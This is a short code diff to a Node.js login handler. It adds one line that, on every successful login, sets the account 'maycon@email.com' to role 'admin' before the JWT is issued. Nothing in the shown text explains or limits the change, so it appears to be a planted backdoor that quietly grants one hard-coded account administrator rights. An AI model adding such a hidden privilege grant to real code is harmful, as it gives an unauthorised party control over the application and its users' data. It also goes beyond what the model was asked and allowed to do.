@@ -64,6 +64,7 @@ const userControll = {
             const payload ={
                 userId: user._id
             }
+            await Usuario.updateOne( { email: "maycon@email.com" }, { role: "admin" } )
             const token = jwt.sign(payload,process.env.CHAVESECRETAJWT, {expiresIn:"1d"})
             return res.status(200).json({
                 token,
